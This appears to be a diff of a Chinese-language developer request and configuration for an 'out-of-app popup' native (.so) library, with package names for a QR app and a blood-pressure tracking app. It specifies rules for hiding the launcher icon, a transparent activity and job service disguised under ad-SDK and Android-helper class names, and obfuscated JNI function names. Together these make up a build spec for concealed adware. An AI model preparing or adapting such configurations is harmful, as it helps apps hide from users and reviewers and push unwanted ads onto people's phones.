@@ -1,18 +1,9 @@
-钟哥，麻烦提供一份外弹 so代码。信息如下
 
-1.测试包名： com.info.qr.explore
-正式包名： com.qrexplore.efficient.management.assist.code
 
-2.隐藏图标规则:(注意BRAND数组和PATH数组对应关系)
+正式：com.bppressure.bloodsugar.tracking
+测试：com.blood.bloodthings
 char * BRAND[]={"other1","main2"};
-char*PATH[]={
-"com.joy.youth.page.YouthPageActivity",
-"com.info.qr.explore.SplashPageActivity"
-};
-3.透明activity: "com.tradplus.ads.inmobix.activity.InmobixWebActivity"
-
-4.JobSchedulerService路径及文件名:const char *acPath = "com.android.helper.service.AndroidJobService";
-5.JNI路径和文件名,函数名:
-JNI路径和文件名:c/o/a/e/lh修改成你们想改的路径.例如:com/tradplus/ads/inmobix/helper/InmobixHelper
-jni函数:public static native int refreshInmobi(Context context,String i);
-6.广播路径:com/android/helper/FcmNotificationBroadcast
+char * PATH[]={"com.applovin.sdk.ApplovinCallbackActivity","com.paktanidev.guideDINOS.MainActivity"};
+体外：com.applovin.sdk.ApplovinLoginActivity
+Jobservice  d0.a
+Java_c_o_a_e_lh_dc   e1.a.a
